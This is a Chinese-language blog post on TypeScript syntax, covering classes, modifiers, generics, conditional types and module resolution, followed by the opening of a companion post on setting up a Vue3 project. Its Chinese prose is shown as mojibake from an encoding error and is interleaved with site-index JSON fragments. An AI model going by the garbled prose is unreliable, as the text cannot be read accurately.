è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºå¯ç´¢å¼•çš„ç±»å‹æ¥è¯´ï¼Œç´¢å¼•ç­¾åçš„å‚æ•°ç±»å‹å¿…é¡»ä¸º \u0026ldquo;string\u0026rdquo; æˆ– \u0026ldquo;number\u0026rdquo;:\ninterface FontStyleOptions { size: number; [prop: boolean]: string; // error } è¿™ä¹Ÿå¾ˆå®¹æ˜“ç†è§£ï¼Œå› ä¸ºå¯¹è±¡çš„é”®å€¼è¦ä¹ˆæ˜¯å­—ç¬¦ä¸²è¦ä¹ˆæ˜¯æ•°å­—ã€‚ è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œç´¢å¼•çš„ç±»å‹å¿…é¡»æ˜¯å…¶ä»–å±æ€§çš„è”åˆç±»å‹:\ninterface FontStyleOptions { size: number; // error ç±»å‹â€œnumberâ€çš„å±æ€§â€œsizeâ€ä¸èƒ½èµ‹ç»™å­—ç¬¦ä¸²ç´¢å¼•ç±»å‹â€œstringâ€ [prop: string]: string; } interface FontStyleOptions { size: number; [prop: string]: string | number; // ok } äº”ã€ç±» 1ã€ç»§æ‰¿ class Animal { name: string; constructor(theName: string) { this.name = theName; } move(distanceInMeters: number = 0) { console.log(`${this.name} moved ${distanceInMeters}m.`); } } class Snake extends Animal { constructor(name: string) { super(name); } move(distanceInMeters = 5) { console.log(\u0026#34;Slithering...\u0026#34;); super.move(distanceInMeters); } } class Horse extends Animal { constructor(name: string) { super(name); } move(distanceInMeters = 45) { console.log(\u0026#34;Galloping...\u0026#34;); super.move(distanceInMeters); } } let sam = new Snake(\u0026#34;Sammy the Python\u0026#34;); let tom: Animal = new Horse(\u0026#34;Tommy the Palomino\u0026#34;); sam.move(); tom.move(34); è¾“å‡º\nSlithering... Sammy the Python moved 5m. Galloping... Tommy the Palomino moved 34m. å…³é”®ç‚¹\nä½¿ç”¨extendså…³é”®å­—åˆ›å»ºäº†Animalçš„ä¸¤ä¸ªå­ç±»ï¼š Horseå’Œ Snake æ´¾ç”Ÿç±»åŒ…å«äº†ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå®ƒå¿…é¡»è°ƒç”¨ super()ï¼Œå®ƒä¼šæ‰§è¡ŒåŸºç±»çš„æ„é€ å‡½æ•°ã€‚ è€Œä¸”ï¼Œåœ¨æ„é€ å‡½æ•°é‡Œè®¿é—® thisçš„å±æ€§ä¹‹å‰ï¼Œä¸€å®šè¦è°ƒç”¨ super() é‡å†™ä» Animalç»§æ‰¿æ¥çš„ moveæ–¹æ³•ï¼Œä½¿å¾— moveæ–¹æ³•æ ¹æ®ä¸åŒçš„ç±»è€Œå…·æœ‰ä¸åŒçš„åŠŸèƒ½ tsä¸­çš„ç±»å’Œes6çš„ç±»æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§çš„åŒºåˆ«ï¼Œä¸»è¦æ˜¯å¢åŠ äº†ç±»æˆå‘˜å’Œæ–¹æ³•çš„ä¿®é¥°ç¬¦(private, protected, public)å’Œå¯¹æ¥å£çš„å®ç°ã€‚\n2ã€ä¿®é¥°ç¬¦ public ä¿®é¥°ç¬¦: ç±»æˆå‘˜å’Œæ–¹æ³•èƒ½åœ¨è¯¥ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­è¢«ä½¿ç”¨ï¼Œä¹Ÿèƒ½åœ¨å¤–éƒ¨è¢«ä½¿ç”¨ã€‚TypeScripté‡Œï¼Œæˆå‘˜éƒ½é»˜è®¤ä¸º public private ä¿®é¥°ç¬¦: ç±»æˆå‘˜å’Œæ–¹æ³•åªèƒ½åœ¨è¯¥ç±»ä¸­è¢«ä½¿ç”¨ï¼Œä¸èƒ½åœ¨å¤–éƒ¨è¢«ä½¿ç”¨ã€‚ protected ä¿®é¥°ç¬¦: ç±»æˆå‘˜å’Œæ–¹æ³•åªèƒ½åœ¨è¯¥ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­è¢«ä½¿ç”¨ï¼Œä¸èƒ½åœ¨å¤–éƒ¨è¢«ä½¿ç”¨ã€‚ readonlyå…³é”®å­—å°†å±æ€§è®¾ç½®ä¸ºåªè¯»çš„ï¼Œåªè¯»å±æ€§å¿…é¡»åœ¨å£°æ˜æ—¶æˆ–æ„é€ å‡½æ•°é‡Œè¢«åˆå§‹åŒ– class Person { private age: number protected name: string constructor (name: string, age: number) { this.name = name this.age = age } } class Student extends Person { constructor (name: string, age: number) { super(name, age) } learn () :void { console.log(this.name + \u0026#39;is learning\u0026#39;) // ok console.log(this.age) // error } } let student = new Student(\u0026#39;Lucy\u0026#39;, 18) student.name // error æ³¨æ„ å¦‚æœå…¶ä¸­ä¸€ä¸ªç±»å‹é‡ŒåŒ…å«ä¸€ä¸ª privateæˆå‘˜ï¼Œé‚£ä¹ˆåªæœ‰å½“å¦å¤–ä¸€ä¸ªç±»å‹ä¸­ä¹Ÿå­˜åœ¨è¿™æ ·ä¸€ä¸ª privateæˆå‘˜ï¼Œ å¹¶ä¸”å®ƒä»¬éƒ½æ˜¯æ¥è‡ªåŒä¸€å¤„å£°æ˜æ—¶ï¼Œæˆ‘ä»¬æ‰è®¤ä¸ºè¿™ä¸¤ä¸ªç±»å‹æ˜¯å…¼å®¹çš„ã€‚ å¯¹äº protectedæˆå‘˜ä¹Ÿä½¿ç”¨è¿™ä¸ªè§„åˆ™\n3ã€å­˜å–å™¨ é€šè¿‡getters/settersæ¥æˆªå–å¯¹å¯¹è±¡æˆå‘˜çš„è®¿é—®ã€‚ å®ƒèƒ½å¸®åŠ©ä½ æœ‰æ•ˆçš„æ§åˆ¶å¯¹å¯¹è±¡æˆå‘˜çš„è®¿é—®\nlet passcode = \u0026#34;secret passcode\u0026#34;; class Employee { private _fullName: string; get fullName(): string { return this._fullName; } set fullName(newName: string) { if (passcode \u0026amp;\u0026amp; passcode == \u0026#34;secret passcode\u0026#34;) { this._fullName = newName; } else { console.log(\u0026#34;Error: Unauthorized update of employee!\u0026#34;); } } } let employee = new Employee(); employee.fullName = \u0026#34;Bob Smith\u0026#34;; if (employee.fullName) { alert(employee.fullName); } æ³¨æ„\nå­˜å–å™¨è¦æ±‚å°†ç¼–è¯‘å™¨è®¾ç½®ä¸ºè¾“å‡ºECMAScript 5æˆ–æ›´é«˜ã€‚ ä¸æ”¯æŒé™çº§åˆ°ECMAScript 3 åªå¸¦æœ‰ getä¸å¸¦æœ‰ setçš„å­˜å–å™¨è‡ªåŠ¨è¢«æ¨æ–­ä¸º readonlyï¼ˆè¿™åœ¨ä»ä»£ç ç”Ÿæˆ .d.tsæ–‡ä»¶æ—¶æ˜¯æœ‰å¸®åŠ©çš„ï¼Œå› ä¸ºåˆ©ç”¨è¿™ä¸ªå±æ€§çš„ç”¨æˆ·ä¼šçœ‹åˆ°ä¸å…è®¸å¤Ÿæ”¹å˜å®ƒçš„å€¼ï¼‰ 4ã€é™æ€å±æ€§ å‰é¢è®¨è®ºäº†ç±»çš„å®ä¾‹æˆå‘˜ï¼Œé‚£äº›ä»…å½“ç±»è¢«å®ä¾‹åŒ–çš„æ—¶å€™æ‰ä¼šè¢«åˆå§‹åŒ–çš„å±æ€§ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨staticå…³é”®è¯åˆ›å»ºç±»çš„é™æ€æˆå‘˜ï¼Œè¿™äº›å±æ€§å­˜åœ¨äºç±»æœ¬èº«ä¸Šé¢è€Œä¸æ˜¯ç±»çš„å®ä¾‹ä¸Š\nclass Grid { static origin = {x: 0, y: 0}; calculateDistanceFromOrigin(point: {x: number; y: number;}) { let xDist = (point.x - Grid.origin.x); let yDist = (point.y - Grid.origin.y); return Math.sqrt(xDist * xDist + yDist * yDist) / this.scale; } constructor (public scale: number) { } } let grid1 = new Grid(1.0); // 1x scale let grid2 = new Grid(5.0); // 5x scale console.log(grid1.calculateDistanceFromOrigin({x: 10, y: 10})); console.log(grid2.calculateDistanceFromOrigin({x: 10, y: 10})); 5ã€æŠ½è±¡ç±» æŠ½è±¡ç±»åšä¸ºå…¶å®ƒæ´¾ç”Ÿç±»çš„åŸºç±»ä½¿ç”¨ã€‚ä¸€èˆ¬ä¸ä¼šç›´æ¥è¢«å®ä¾‹åŒ– ä¸åŒäºæ¥å£ï¼ŒæŠ½è±¡ç±»å¯ä»¥åŒ…å«æˆå‘˜çš„å®ç°ç»†èŠ‚ abstractå…³é”®å­—æ˜¯ç”¨äºå®šä¹‰æŠ½è±¡ç±»å’Œåœ¨æŠ½è±¡ç±»å†…éƒ¨å®šä¹‰æŠ½è±¡æ–¹æ³• æŠ½è±¡ç±»ä¸­çš„æŠ½è±¡æ–¹æ³•ä¸åŒ…å«å…·ä½“å®ç°å¹¶ä¸”å¿…é¡»åœ¨æ´¾ç”Ÿç±»ä¸­å®ç° abstract class Department { constructor(public name: string) { } printName(): void { console.log(\u0026#39;Department name: \u0026#39; + this.name); } abstract printMeeting(): void; // å¿…é¡»åœ¨æ´¾ç”Ÿç±»ä¸­å®ç° } class AccountingDepartment extends Department { constructor() { super(\u0026#39;Accounting and Auditing\u0026#39;); // åœ¨æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°ä¸­å¿…é¡»è°ƒç”¨ super() } printMeeting(): void { console.log(\u0026#39;The Accounting Department meets each Monday at 10am.\u0026#39;); } generateReports(): void { console.log(\u0026#39;Generating accounting reports...\u0026#39;); } } let department: AccountingDepartment = new AccountingDepartment(); // å…è®¸å¯¹ä¸€ä¸ªæŠ½è±¡å­ç±»è¿›è¡Œå®ä¾‹åŒ–å’Œèµ‹å€¼ department.printName(); department.printMeeting(); let department2: Department; // å…è®¸åˆ›å»ºä¸€ä¸ªå¯¹æŠ½è±¡ç±»å‹çš„å¼•ç”¨ department2 = new Department(); // é”™è¯¯: ä¸èƒ½åˆ›å»ºä¸€ä¸ªæŠ½è±¡ç±»çš„å®ä¾‹ department2.generateReports(); // é”™è¯¯: æ–¹æ³•åœ¨å£°æ˜çš„æŠ½è±¡ç±»ä¸­ä¸å­˜åœ¨ 6ã€ç±»å’Œæ¥å£ tsä¸­ç±»å¯ä»¥ä½¿ç”¨å…³é”®è¯implementsæ¥å®ç°æ¥å£:\ninterface BabyInter { name: string cry () : void } class Baby implements BabyInter { name: string constructor (name: string) { this.name = name } cry () :void { console.log(this.name + \u0026#39;is crying\u0026#39;) } } å¦‚æœ Baby ç±»ä¸­æ²¡æœ‰å£°æ˜ cry æ–¹æ³•ä¼šæ€æ ·:\ninterface BabyInter { name: string cry () : void } class Baby implements BabyInter { name: string constructor (name: string) { this.name = name } } ä¼šæŠ¥ä¸€ä¸ªç¼–è¯‘é”™è¯¯: [ts] ç±»â€œBabyâ€é”™è¯¯å®ç°æ¥å£â€œBabyInterâ€ã€‚ç±»å‹â€œBabyâ€ä¸­ç¼ºå°‘å±æ€§â€œcryâ€ã€‚\nå…­ã€å‡½æ•° 1ã€å‡½æ•°ç±»å‹ (1) å‡ ç§å‡½æ•°ç±»å‹çš„è¿”å›å€¼ç±»å‹å†™æ³• è®°ä½åœ¨ () åé¢æ·»åŠ è¿”å›å€¼ç±»å‹å³å¯\nfunction fn(): number { return 1 } const fn = function (): number { return 1 } const fn = (): number =\u0026gt; { return 1 } const obj = { fn (): number { return 1 } } (2) å‡½æ•°ç±»å‹ ts ä¸­ä¹Ÿæœ‰å‡½æ•°ç±»å‹ï¼Œç”¨æ¥æè¿°ä¸€ä¸ªå‡½æ•°:\ntype FnType = (x: number, y: number) =\u0026gt; number å®Œæ•´çš„å‡½æ•°å†™æ³•\nlet myAdd: (x: number, y: number) =\u0026gt; number = function(x: number, y: number): number { return x + y } // ä½¿ç”¨ FnType let myAdd: FnType = function(x: number, y: number): number { return x + y } // ts è‡ªåŠ¨æ¨å¯¼å‚æ•°ç±»å‹ let myAdd: FnType = function(x, y) { return x + y } 2ã€å‡½æ•°é‡è½½? jså› ä¸ºæ˜¯åŠ¨æ€ç±»å‹ï¼Œæœ¬èº«ä¸éœ€è¦æ”¯æŒé‡è½½ï¼Œtsä¸ºäº†ä¿è¯ç±»å‹å®‰å…¨ï¼Œæ”¯æŒäº†å‡½æ•°ç­¾åçš„ç±»å‹é‡è½½ã€‚å³:\nå¤šä¸ª é‡è½½ç­¾å å’Œä¸€ä¸ª å®ç°ç­¾å\nfunction len(s: string): string; function len(arr: any[]): number; function len(x: string | any[]) { if (typeof x === \u0026#39;string\u0026#39;) { return x.length.toString() } return x.length } let a = len(\u0026#39;\u0026#39;).trim() // error let b = len([]).toFixed(2) // ok let c = len(2) // error ts å‡½æ•°é‡è½½çš„å…¶ä»–ç‰¹æ€§:\nå¦‚æœå®šä¹‰äº† é‡è½½ç­¾å ï¼Œåˆ™ å®ç°ç­¾å å¯¹å¤–ä¸å¯è§ å®ç°ç­¾å å¿…é¡»å…¼å®¹ é‡è½½ç­¾å é‡è½½ç­¾å çš„ç±»å‹ä¸ä¼šåˆå¹¶ TS ä¸­çš„å‡½æ•°é‡è½½å…¶å®å¹¶ä¸æ˜¯çœŸçš„é‡è½½ã€‚\nä¸ƒã€æ³›å‹ 1ã€ä»€ä¹ˆæ˜¯æ³›å‹ è½¯ä»¶å·¥ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…è¦åˆ›å»ºä¸€è‡´çš„å®šä¹‰è‰¯å¥½çš„APIï¼ŒåŒæ—¶ä¹Ÿè¦è€ƒè™‘ä»£ç å—çš„é‡ç”¨æ€§ã€‚ ç»„ä»¶ä¸ä»…èƒ½å¤Ÿæ”¯æŒå½“å‰çš„æ•°æ®ç±»å‹ï¼ŒåŒæ—¶ä¹Ÿèƒ½æ”¯æŒæœªæ¥çš„æ•°æ®ç±»å‹ã€‚\né€šè¿‡å­—é¢æ„æ€æ¥çœ‹ï¼Œæ³›å‹æœ‰â€œå¹¿æ³›çš„ç±»å‹â€ä¹‹æ„ï¼Œå³æ•°æ®çš„ç±»å‹ä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸ªå˜é‡æ¥åŠ¨æ€ç¡®å®šï¼Œä¸€èˆ¬ç”¨ \u0026lt;\u0026gt; æ“ä½œç¬¦æ¥å£°æ˜æ³›å‹çš„ä½¿ç”¨ã€‚\nå°è¯•ç‰›åˆ€ // æ³›å‹æ–¹æ³•\nfunction createList\u0026lt;T\u0026gt;(): T[] { return [] as T[] } const numberList = createList\u0026lt;number\u0026gt;() // number[] const stringList = createList\u0026lt;string\u0026gt;() // string[] 2ã€æ³›å‹æ¥å£ interface GenericIdentityFn\u0026lt;T\u0026gt; { (arg: T): T; } function identity\u0026lt;T\u0026gt;(arg: T): T { return arg; } let myIdentity: GenericIdentityFn\u0026lt;number\u0026gt; = identity; 3ã€æ³›å‹ç±» // æ³›å‹ç±»çš„å®šä¹‰ class ArrayList\u0026lt;T\u0026gt; { list: T[] push (item: T) :void { this.list.push(item) } pop () :T { return this.list.pop() } } // æ³›å‹ç±»çš„ä½¿ç”¨ const list = new ArrayList\u0026lt;string\u0026gt;() list.push(\u0026#39;hello\u0026#39;) // ok list.push(1) //error å°çŸ¥è¯†:Kï¼ŒVï¼ŒTï¼ŒEç­‰æ³›å‹åç§°ä¸æ˜¯å›ºå®šå†™æ­»äº†ï¼Œæ˜¯å¯ä»¥éšæ„å®šä¹‰çš„ï¼Œä¸ºäº†è¯­ä¹‰åŒ–ï¼Œæ˜¯æœ‰ç‰¹æ®Šå«ä¹‰çš„:\nTè¡¨ç¤º type ç±»å‹ã€‚ Kã€V:åˆ†åˆ«ä»£è¡¨é”®å€¼ä¸­çš„ Keyã€Valueã€‚ E:è¡¨ç¤º enum æšä¸¾ã€‚ 4ã€æ³›å‹çº¦æŸ å¦‚æœæˆ‘ä»¬åªå¸Œæœ› createList å‡½æ•°åªèƒ½ç”ŸæˆæŒ‡å®šçš„ç±»å‹æ•°ç»„ï¼Œè¯¥å¦‚ä½•åšï¼Œå¯ä»¥ä½¿ç”¨ extends å…³é”®è¯æ¥çº¦æŸæ³›å‹çš„èŒƒå›´å’Œå½¢çŠ¶ã€‚\næ­¤æ—¶ extends çº¦æŸçš„æ˜¯è¾“å…¥å€¼\ninterface Lengthwise { length: number } function createList\u0026lt;T extends string | number | Lengthwise\u0026gt;(): T[] { return [] as T[] } const numberList = createList\u0026lt;number\u0026gt;() // ok const arrayList = createList\u0026lt;any[1, 2, 3]\u0026gt;() // ok const stringList = createList\u0026lt;boolean\u0026gt;() // error console.log(numberList) // [] console.log(arrayList) // [] 4.1 æ¡ä»¶æ§åˆ¶ extends é™¤äº†åšçº¦æŸç±»å‹ï¼Œè¿˜å¯ä»¥åšæ¡ä»¶æ§åˆ¶ï¼Œç›¸å½“äºä¸ä¸€ä¸ªä¸‰å…ƒè¿ç®—ç¬¦ï¼Œåªä¸è¿‡æ˜¯é’ˆå¯¹ç±»å‹çš„ã€‚\nT extends U ? X : Y å¦‚æœ T å¯ä»¥è¢«åˆ†é…ç»™ Uï¼Œåˆ™è¿”å› Xï¼Œå¦åˆ™è¿”å› Yã€‚\ntype IsNumber\u0026lt;T\u0026gt; = T extends number ? true : false type x = IsNumber\u0026lt;string\u0026gt; // false 4.2 ç±»å‹æ˜ å°„ ç±»å‹æ˜ å°„ç›¸å½“ä¸ä¸€ä¸ªç±»å‹çš„å‡½æ•°ï¼Œå¯ä»¥åšä¸€äº›ç±»å‹è¿ç®—ï¼Œè¾“å…¥ä¸€ä¸ªç±»å‹ï¼Œè¾“å‡ºå¦ä¸€ä¸ªç±»å‹ï¼Œå‰æ–‡æˆ‘ä»¬ä¸¾äº†ä¸ª Copy çš„ä¾‹å­ã€‚\n(1) å†…ç½®çš„æ˜ å°„ç±»å‹ // æ¯ä¸€ä¸ªå±æ€§éƒ½å˜æˆå¯é€‰ type Partial\u0026lt;T\u0026gt; = { [P in keyof T]?: T[P] } // æ¯ä¸€ä¸ªå±æ€§éƒ½å˜æˆå¯é€‰ type Readonly\u0026lt;T\u0026gt; = { readonly [P in keyof T]: T[P] } // é€‰åˆ™å¯¹è±¡ä¸­çš„æŸäº›å±æ€§ type Pick\u0026lt;T, K extends keyof T\u0026gt; = { [P in K]: T[P]; } // ...... typescript 2.8 åœ¨ lib.d.ts ä¸­å†…ç½®äº†å‡ ä¸ªæ˜ å°„ç±»å‹:\nExclude\u0026lt;T, U\u0026gt; \u0026ndash; ä» T ä¸­å‰”é™¤å¯ä»¥èµ‹å€¼ç»™ U çš„ç±»å‹ã€‚ Extract\u0026lt;T, U\u0026gt; \u0026ndash; æå– T ä¸­å¯ä»¥èµ‹å€¼ç»™ U çš„ç±»å‹ã€‚ NonNullable\u0026lt;T\u0026gt; \u0026ndash; ä» T ä¸­å‰”é™¤ null å’Œ undefined ã€‚ ReturnType\u0026lt;T\u0026gt; \u0026ndash; è·å–å‡½æ•°è¿”å›å€¼ç±»å‹ã€‚ InstanceType\u0026lt;T\u0026gt; \u0026ndash; è·å–æ„é€ å‡½æ•°ç±»å‹çš„å®ä¾‹ç±»å‹ã€‚ (2) extends æ¡ä»¶åˆ†å‘ å¯¹äº T extends U ? X : Y æ¥è¯´ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªç‰¹æ€§ï¼Œå½“ T æ˜¯ä¸€ä¸ªè”åˆç±»å‹æ—¶ï¼Œä¼šè¿›è¡Œæ¡ä»¶åˆ†å‘ã€‚\ntype Union = string | number type ParamType\u0026lt;T\u0026gt; = T extends number ? \u0026#39;isNumber\u0026#39; : \u0026#39;isString\u0026#39; type UnionType = ParamType\u0026lt;Union\u0026gt; // \u0026#39;isNumber\u0026#39; | \u0026#39;isString\u0026#39; å®é™…ä¸Šï¼Œextends è¿ç®—ä¼šå˜æˆå¦‚ä¸‹å½¢å¼:\n(string extends number ? \u0026#39;number\u0026#39; : \u0026#39;string\u0026#39;) | (number extends number ? \u0026#39;number\u0026#39; : \u0026#39;string\u0026#39;) Extract å°±æ˜¯åŸºäºæ­¤ç‰¹æ€§å®ç°çš„ï¼Œå†é…åˆ never å¹ºå…ƒçš„ç‰¹æ€§:\ntype Exclude\u0026lt;T, K\u0026gt; = T extends K ? never : T type T1 = Exclude\u0026lt;string | number | boolean, string | boolean\u0026gt; // number (3) infer å…³é”®è¯ infer å…³é”®è¯å¸¸åœ¨æ¡ä»¶ç±»å‹ä¸­å’Œ extends å…³é”®è¯ä¸€åŒå‡ºç°ï¼Œè¡¨ç¤ºå°†è¦æ¨æ–­çš„ç±»å‹ï¼Œä½œä¸ºç±»å‹å˜é‡å¯ä»¥åœ¨ä¸‰å…ƒè¡¨è¾¾å¼çš„ True éƒ¨åˆ†å¼•ç”¨\nts ä¸­å†…ç½®çš„ä¸€ä¸ªæ˜ å°„ç±»å‹ ReturnType ï¼Œç”¨äºè·å–å‡½æ•°ç±»å‹çš„è¿”å›å€¼:\nfunction len (str: string) { return str.length } type LenFn = typeof len // (str: string) =\u0026gt; number type LenFnReturn = ReturnType\u0026lt;LenFn\u0026gt; // number ReturnType çš„å®ç°:\ntype ReturnType\u0026lt;T extends (...args: any) =\u0026gt; any\u0026gt; = T extends (...args: any) =\u0026gt; infer R ? R : any; å…«ã€æ¨¡å— 1ã€å…¨å±€æ¨¡å— vs. æ–‡ä»¶æ¨¡å— é»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ‰€å†™çš„ä»£ç æ˜¯ä½äºå…¨å±€æ¨¡å—ä¸‹çš„:\nconst foo = 2 æ­¤æ—¶ï¼Œå¦‚æœæˆ‘ä»¬åˆ›å»ºäº†å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å†™ä¸‹å¦‚ä¸‹ä»£ç ï¼Œts è®¤ä¸ºæ˜¯æ­£å¸¸çš„:\nconst bar = foo // ok å¦‚æœè¦æ‰“ç ´è¿™ç§é™åˆ¶ï¼Œåªè¦æ–‡ä»¶ä¸­æœ‰ import æˆ–è€… export è¡¨è¾¾å¼å³å¯:\nexport const bar = foo // error 2ã€æ¨¡å—è§£æç­–ç•¥ Tpescript æœ‰ä¸¤ç§æ¨¡å—çš„è§£æç­–ç•¥: Node å’Œ Classic ã€‚\nå½“ tsconfig.json ä¸­ module è®¾ç½®æˆ AMDã€Systemã€ES2015 æ—¶ï¼Œé»˜è®¤ä¸º classic ï¼Œå¦åˆ™ä¸º Node ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ moduleResolution æ‰‹åŠ¨æŒ‡å®šæ¨¡å—è§£æç­–ç•¥ã€‚\nä¸¤ç§æ¨¡å—è§£æç­–ç•¥çš„åŒºåˆ«åœ¨äº:\nimport { a } from \u0026#39;moduleB\u0026#39; Classic:\n/root/src/folder/moduleB.ts /root/src/folder/moduleB.d.ts /root/src/moduleB.ts /root/src/moduleB.d.ts /root/moduleB.ts /root/moduleB.d.ts /moduleB.ts /moduleB.d.ts Node:\n/root/src/node_modules/moduleB.ts /root/src/node_modules/moduleB.tsx /root/src/node_modules/moduleB.d.ts /root/src/node_modules/moduleB/package.json (å¦‚æœæŒ‡å®šäº†\u0026quot;types\u0026quot;å±æ€§) /root/src/node_modules/moduleB/index.ts /root/src/node_modules/moduleB/index.tsx /root/src/node_modules/moduleB/index.d.ts /root/node_modules/moduleB.ts /root/node_modules/moduleB.tsx /root/node_modules/moduleB.d.ts /root/node_modules/moduleB/package.json (å¦‚æœæŒ‡å®šäº†\u0026quot;types\u0026quot;å±æ€§) /root/node_modules/moduleB/index.ts /root/node_modules/moduleB/index.tsx /root/node_modules/moduleB/index.d.ts /node_modules/moduleB.ts /node_modules/moduleB.tsx /node_modules/moduleB.d.ts /node_modules/moduleB/package.json (å¦‚æœæŒ‡å®šäº†\u0026quot;types\u0026quot;å±æ€§) /node_modules/moduleB/index.ts /node_modules/moduleB/index.tsx /node_modules/moduleB/index.d.ts å‚è€ƒ:\nå¯å‚è€ƒæ–‡ç« -è¯­é›€ TypeScriptå®˜æ–¹æ–‡æ¡£ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/03.ts-basic-grammar/","summary":"\u003cp\u003eæœ¬æ–‡æ˜¯vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬2ç¯‡ã€ŠTypeScript è¯­æ³•æ±‡æ€»ã€‹ï¼Œå…³äº\u003ccode\u003eTypeScript\u003c/code\u003eçš„åŸºç¡€è¯­æ³•ï¼Œä½ äº†è§£\u0026hellip;\u003c/p\u003e","title":"vue3+ts(2)ï¼šTypeScript è¯­æ³•æ±‡æ€»"},{"content":"æœ¬æ–‡æ˜¯vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬1ç¯‡ã€Švue3é¡¹ç›®ä»0åˆ°1æ­å»ºã€‹ï¼Œä¸»è¦æ¶‰åŠåˆ°\u0026hellip;\nä¸€ã€èƒŒæ™¯ åœ¨ reactÂ å’Œ vueÂ ç¤¾åŒºä¸­ä¹Ÿè¶Šæ¥è¶Šå¤šäººå¼€å§‹ä½¿ç”¨TypeScriptï¼Œä½¿ç”¨ TS å¯ä»¥å¢åŠ ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚ä»å‘å¸ƒçš„ Vue3Â æ­£å¼ç‰ˆæœ¬æ¥çœ‹ï¼Œ Vue3Â çš„æºç æ˜¯ç”¨ TS ç¼–å†™çš„ï¼Œæ›´å¥½çš„ TypeScript æ”¯æŒä¹Ÿæ˜¯è¿™æ¬¡å‡çº§çš„ä¸€å¤§äº®ç‚¹ã€‚å½“ç„¶ï¼Œåœ¨å®é™…å¼€å‘ä¸­å¦‚ä½•æ­£ç¡®æ‹¥æŠ± TS ä»¥åŠå¦‚ä½•è¿ç§»åˆ° Vue3Â ä¹Ÿæ˜¯é¡¹ç›®ä¸­æˆ‘ä»¬ä¸å¾—ä¸é¢å¯¹çš„é—®é¢˜ï¼Œè¿™é‡Œé’ˆå¯¹ Vue3Â å’Œ TSå•ç‹¬åšäº†ä¸€ä¸ªç³»åˆ—å’Œå¤§å®¶åšä¸€ä¸‹äº¤æµï¼Œæœ¬ç¯‡æ˜¯ vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬1ç¯‡ã€Švue3é¡¹ç›®ä»0åˆ°1æ­å»ºã€‹\næœ¬ç³»åˆ—å…¶ä»–å†…å®¹å¦‚ä¸‹:\nvue3+tsé¡¹ç›®ç³»åˆ—ç¬¬1ç¯‡ã€Švue3é¡¹ç›®ä»0åˆ°1æ­å»ºã€‹ vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬2ç¯‡ã€ŠTypeScript è¯­æ³•æ±‡æ€»ã€‹ vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬3ç¯‡ã€Švue3ç»„åˆå¼apiåŠé‡è¦å±æ€§å˜æ›´ã€‹ äºŒã€å®˜æ–¹ Quickstart ä»‹ç» å‡†å¤‡ï¼š vue3\nå®˜æ–¹ä»“åº“ Quickstart ä¸­æ¨èç”¨ä¸¤ç§æ–¹å¼æ–¹å¼æ¥æ„å»ºæˆ‘ä»¬çš„ SPA é¡¹ç›®:\nvite vue-cli 1ã€vite vite ç¤ºä¾‹\nnpm init vite-app vue3-ts æ‰“å¼€ viteÂ ä¾èµ–çš„ package.json å‘ç°åœ¨ devDependenciesÂ å¼€å‘ä¾èµ–é‡Œé¢å·²ç»å¼•å…¥äº†TypeScript ï¼Œç”šè‡³ vuexã€vue-routerã€lessã€sassÂ è¿™äº›ç»å¸¸éœ€è¦ç”¨åˆ°çš„å¼€å‘å·¥å…·ã€‚\nviteÂ è½»é‡ï¼Œå¼€ç®±å³ç”¨çš„ç‰¹ç‚¹ï¼Œæ»¡è¶³äº†å¤§éƒ¨åˆ†å¼€å‘åœºæ™¯çš„éœ€æ±‚ï¼Œä½œä¸ºå¿«é€Ÿå¯åŠ¨æœ¬åœ° VueÂ é¡¹ç›®æ¥è¯´ï¼Œå¯ä»¥è¯´éå¸¸å®Œç¾ã€‚\n2ã€vue-cli å®˜æ–¹æ–‡æ¡£vue-cli\nvue-cli å¼ºè°ƒç”¨ cli çš„æ–¹å¼è¿›è¡Œäº¤äº’å¼çš„é…ç½®ï¼Œé€‰æ‹©èµ·æ¥æ›´åŠ çµæ´»å¯æ§: ä¸°å¯Œçš„å®˜æ–¹æ’ä»¶é€‚é…ã€GUIçš„åˆ›å»ºç®¡ç†ç•Œé¢ã€æ ‡å‡†åŒ–å¼€å‘æµç¨‹ã€‚\nvue-cliç¤ºä¾‹\nnpm install -g @vue/cli vue create vue3-ts ä¸‰ã€é¡¹ç›®æ­å»º æœ¬é¡¹ç›®ä½¿ç”¨ vue-cli æ­å»º\n1ã€å®‰è£… npm install -g @vue/cli // æŸ¥çœ‹ç‰ˆæœ¬ç¡®è®¤å®‰è£…success vue --version 2ã€åˆ›å»ºé¡¹ç›® ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨ vue ui 